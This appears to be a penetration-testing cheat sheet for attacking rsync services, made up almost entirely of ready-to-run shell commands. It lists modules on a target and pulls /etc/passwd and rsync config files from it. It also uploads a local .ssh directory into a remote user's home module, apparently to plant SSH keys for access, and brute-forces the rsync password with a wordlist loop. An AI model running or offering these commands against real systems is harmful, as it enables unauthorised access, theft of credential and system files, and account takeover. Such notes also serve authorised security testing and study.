---
title: "rsync"
date: 2024-7-12
tags: ["rsync"]
---

### Basic Commands

<div>

```console
# List directory ('/')
rsync --list-only -a rsync://<TARGET>/
```

```console
# List directory ('/') with ipv6
rsync --list-only -a rsync://[<TARGET_IPV6>]:8730/
```

```console
# List a file
rsync --list-only -a rsync://<TARGET>/etc/passwd
```

```console
# List files (wildcard)
rsync --list-only -a rsync://<TARGET>/etc/rsync*
```

```console
# Get a file
rsync -a rsync://<TARGET>/etc/passwd .
```

```console
# Get files (wildcard)
rsync -a rsync://<TARGET>/etc/rsync* .
```

```console
# Copy files recusively to remote (With Creds)
export RSYNC_PASSWORD='<PASSWORD>'; rsync -aR .ssh/ rsync://<USER>@<TARGET>/home_user/
```

</div>

<br>

---

### Bruteforce rsync password

<div>

```console
# Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)
cat passwords.txt | while read password; do export RSYNC_PASSWORD=${password}; rsync --list-only rsync://user@<TARGET>/home_user 2>&1 | grep -q "auth failed on module home_user" || { echo "[+] Found: ${RSYNC_PASSWORD}"; break; } done
```

</div>

<br>